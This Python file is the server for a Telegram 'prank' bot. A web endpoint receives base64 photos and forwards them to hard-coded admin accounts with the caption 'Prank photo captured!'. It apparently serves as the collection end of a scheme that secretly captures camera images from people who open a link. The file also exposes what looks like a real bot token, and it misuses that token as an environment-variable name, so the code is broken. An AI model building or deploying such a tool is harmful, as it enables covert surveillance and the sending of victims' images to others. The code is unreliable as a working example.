import logging
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from PIL import Image
import io
import base64
from fastapi import FastAPI, Request
import uvicorn
import asyncio

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Admin IDs
ADMIN_IDS = [5703082829, 2100140929]

# Get the bot token from environment variables
BOT_TOKEN = os.getenv("8179327395:AAFKk65Cp1AUfmaXLB5WOZaV0BB2WEY41xo")

# FastAPI app for webhook
app = FastAPI()
telegram_app = None

# Webhook endpoint to receive photos
@app.post("/webhook")
async def webhook(request: Request):
    data = await request.json()
    photo_data = data.get("photo")
    if not photo_data:
        return {"status": "no photo"}

    # Decode base64 photo
    photo_bytes = base64.b64decode(photo_data.split(",")[1])
    img = Image.open(io.BytesIO(photo_bytes))

    # Save image to bytes
    output = io.BytesIO()
    img.save(output, format="PNG")
    output.seek(0)

    # Send photo to admins
    for admin_id in ADMIN_IDS:
        try:
            await telegram_app.bot.send_photo(
                chat_id=admin_id,
                photo=output,
                caption="Prank photo captured!"
            )
            output.seek(0)  # Reset buffer
        except Exception as e:
            logger.error(f"Failed to send photo to admin {admin_id}: {e}")

    return {"status": "success"}

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Prank Bot ready! Admins will receive photos.")

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.warning(f"Update {update} caused error {context.error}")

async def run_telegram_bot():
    global telegram_app
    telegram_app = Application.builder().token(BOT_TOKEN).build()

    # Add handlers
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_error_handler(error_handler)

    # Start polling
    await telegram_app.initialize()
    await telegram_app.start()
    await telegram_app.updater.start_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    # Run FastAPI and Telegram bot concurrently
    loop = asyncio.get_event_loop()
    loop.create_task(run_telegram_bot())
    uvicorn.run(app, host="0.0.0.0", port=8000)
